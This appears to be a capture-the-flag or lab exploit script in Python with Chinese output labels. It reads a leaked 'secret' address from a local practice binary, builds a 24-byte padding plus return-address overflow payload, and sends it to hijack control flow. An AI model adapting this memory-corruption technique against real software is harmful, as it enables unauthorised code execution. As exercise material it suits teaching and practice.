import subprocess, re

p = subprocess.Popen(["./exp2"],
                     stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE)

addr = None
while True:
    line = p.stdout.readline()
    if not line:
        break
    text = line.decode("utf-8", "replace").strip()
    print("程序说:", text)
    m = re.search(r"secret.*?(0x[0-9a-fA-F]+)", text)
    if m:
        addr = int(m.group(1), 16)
        break

print("泄漏到的 secret 地址 =", hex(addr))

payload = b"A" * 24 + addr.to_bytes(8, "little")[:6]
print("payload 十六进制 =", payload.hex())

p.stdin.write(payload + b"\n")
p.stdin.flush()
print(p.stdout.read().decode("utf-8", "replace"))
